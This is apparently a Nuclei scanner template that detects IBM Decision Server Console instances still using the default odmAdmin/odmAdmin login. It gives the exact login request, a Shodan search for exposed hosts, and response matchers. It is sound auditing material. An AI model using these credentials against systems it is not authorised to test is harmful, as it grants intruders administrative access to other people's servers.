id: ibm-dsc-default-login

info:
  name: IBM Decision Server Console - Default Login
  author: DhiyaneshDK
  severity: high
  reference:
    - https://www.ibm.com/docs/en/odm/8.8.0?topic=center-overview-decision
  metadata:
    verified: true
    shodan-query: "title:\"Rule Execution Server\""
    max-request: 1
  tags: ibm,default-login,decision-server

http:
  - raw:
      - |
        POST /res/j_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username={{username}}&j_password={{password}}

    host-redirects: true
    max-redirects: 3

    attack: pitchfork
    payloads:
      username:
        - odmAdmin
      password:
        - odmAdmin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "odmAdmin"
          - "Sign Out"
          - "Diagnostics"
        condition: and

      - type: status
        status:
          - 200
